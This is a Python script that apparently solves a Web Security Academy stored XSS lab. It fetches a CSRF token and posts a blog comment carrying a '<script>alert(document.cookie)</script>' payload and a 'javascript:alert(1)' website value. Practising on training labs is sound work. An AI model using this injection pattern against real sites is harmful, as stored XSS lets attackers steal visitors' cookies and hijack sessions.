import requests
from bs4 import BeautifulSoup


s = requests.Session()
site = '0ada0030048c1614800e673100b4002e.web-security-academy.net'
blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''<script>alert(document.cookie)</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_string,
    'name' : 'Long',
    'email' : 'lamlon@pdx.edu',
     'website': '''javascript:alert(1)'''
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)

